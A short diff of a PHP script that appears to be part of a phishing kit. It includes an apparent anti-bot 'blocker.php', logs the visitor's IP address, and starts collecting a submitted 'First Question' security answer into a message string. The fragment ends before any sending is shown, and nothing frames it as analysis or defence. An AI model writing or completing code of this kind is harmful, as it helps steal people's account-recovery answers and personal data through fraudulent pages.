@@ -1,5 +1,5 @@
 <?php
-include '../blocker.php';
+include 'blocker.php';
 include 'config.php';
 $ip = getenv("REMOTE_ADDR");
 $message .= "First  Question : " .$_POST['q1']."\n\n";
